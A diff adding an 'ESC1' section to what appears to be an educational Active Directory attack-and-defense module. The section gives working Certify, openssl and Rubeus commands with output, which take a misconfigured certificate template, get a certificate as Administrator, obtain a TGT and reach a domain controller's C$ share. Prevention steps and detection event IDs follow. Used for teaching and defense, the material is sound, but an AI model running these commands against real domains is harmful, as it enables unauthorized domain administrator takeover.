@@ -45,8 +45,9 @@ This module covers **Active Directory attacks and defense** - common attack tech
 12. [Print Spooler & NTLM Relaying](#12-print-spooler--ntlm-relaying)
 13. [Coercing Attacks & Unconstrained Delegation](#13-coercing-attacks--unconstrained-delegation)
 14. [Object ACLs](#14-object-acls)
-15. [Interview Questions](#15-interview-questions)
-16. [Additional Resources](#16-additional-resources)
+15. [PKI - ESC1](#15-pki---esc1)
+16. [Interview Questions](#16-interview-questions)
+17. [Additional Resources](#17-additional-resources)
 
 ---
 
@@ -1991,7 +1992,153 @@ graph LR
 
 ---
 
-## 15. Interview Questions
+## 15. PKI - ESC1
+
+### Description
+
+> 📌 **PKI ESC1** - exploit misconfigured certificate templates to obtain certificates for any user.
+
+```mermaid
+graph LR
+    Attacker[Attacker] -->|Request cert<br/>with SAN| CA[Certificate Authority]
+    CA -->|Issue cert<br/>for Admin| Cert[Certificate]
+    Cert -->|Auth as<br/>Admin| TGT[TGT Ticket]
+    TGT -->|DCSync| Hashes[Password Hashes]
+    
+    style Attacker fill:#ff9999,stroke:#333
+    style CA fill:#ffcccc,stroke:#333
+```
+
+**Why Certificates:**
+- Valid for 1+ years (password reset doesn't invalidate)
+- Misconfigured templates allow any user to enroll
+- Compromising CA = forge Golden Certificates
+
+**ESC1 Vulnerability:**
+- No issuance requirements
+- Enrollable for Client Authentication/Smart Card Logon
+- CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (can specify any SAN)
+
+### Attack
+
+**Step 1: Find vulnerable templates:**
+
+```powershell
+.\Certify.exe find /vulnerable
+```
+
+**Output:**
+
+```
+Enterprise CA Name    : PKI.eagle.local\eagle-PKI-CA
+Template Name        : UserCert
+Validity Period      : 10 years
+msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT
+Enrollment Rights   : EAGLE\Domain Users
+```
+
+<img width="2785" height="1192" alt="image" src="https://github.com/user-attachments/assets/0a81f284-a5bc-4298-b4fc-e581e4742bd6" />
+
+**Vulnerability indicators:**
+- Domain Users can enroll
+- CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT enabled
+- Client Authentication enabled
+- No manager approval required
+
+**Step 2: Request certificate for Administrator:**
+
+```powershell
+.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
+```
+
+**Output:**
+
+```
+[*] Template                : UserCert
+[*] AltName                 : Administrator
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 36
+```
+
+<img width="1885" height="1107" alt="image" src="https://github.com/user-attachments/assets/6464293c-2f9d-467e-83c4-4a7878648443" />
+
+**Step 3: Convert to PFX:**
+
+```bash
+sed -i 's/\s\s\+/\n/g' cert.pem
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+<img width="1172" height="105" alt="image" src="https://github.com/user-attachments/assets/3c7781cb-60d0-47a5-88ab-bf3ababe87de" />
+
+**Step 4: Request TGT with certificate:**
+
+```powershell
+.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
+```
+
+**Output:**
+
+```
+[*] Using PKINIT with etype rc4_hmac
+[+] TGT request successful!
+[*] Ticket successfully imported!
+```
+
+<img width="2599" height="1530" alt="image" src="https://github.com/user-attachments/assets/15385185-f70e-4a2e-a7c9-743b6182e1eb" />
+
+**Step 5: Access DC:**
+
+```cmd
+dir \\dc1\c$
+```
+
+<img width="1437" height="549" alt="image" src="https://github.com/user-attachments/assets/8aa2f286-2b11-4498-be5e-22aa9f6a66d8" />
+
+### Prevention
+
+| Mitigation | Description |
+|-----------|-------------|
+| **Disable ENROLLEE_SUPPLIES_SUBJECT** | Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT |
+| **Require Approval** | CA manager approval for certificates |
+| **Regular Scans** | Use Certify to find PKI issues |
+| **Restrict Enrollment** | Limit who can enroll in sensitive templates |
+
+### Detection
+
+**Event IDs:**
+
+| Event ID | Description |
+|----------|-------------|
+| 4886 | Certificate request received |
+| 4887 | Certificate issued |
+| 4768 | TGT requested with certificate |
+
+**Event 4886/4887 - Certificate issued:**
+
+<img width="972" height="1108" alt="image" src="https://github.com/user-attachments/assets/de020186-0f85-4d4b-986b-26e82dfcebd9" />
+
+**Certificate details in CA:**
+
+<img width="1374" height="70" alt="image" src="https://github.com/user-attachments/assets/b4ea80fa-5be7-4853-9857-3efe003af91f" />
+
+**SAN in certificate (need to open cert):**
+
+<img width="470" height="408" alt="image" src="https://github.com/user-attachments/assets/2fe9a31a-d00e-405c-a012-4bce366251a9" />
+
+**Programmatic viewing (certutil):**
+
+<img width="1695" height="968" alt="image" src="https://github.com/user-attachments/assets/f9e53110-f2de-4e9a-bf15-1ec439aabe1d" />
+
+**Event 4768 - TGT with certificate:**
+
+<img width="1457" height="1028" alt="image" src="https://github.com/user-attachments/assets/dd8331d2-5e21-4d0e-a7d7-3817ebb39cab" />
+
+> 💡 Note: Events 4886/4887 on PKI server, not DC!
+
+---
+
+## 16. Interview Questions
 
 ### Q1: What is Kerberoasting and how does it work?
 
@@ -2169,7 +2316,7 @@ Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} |
 
 ---
 
-## 16. Additional Resources
+## 17. Additional Resources
 
 ### Tools
 
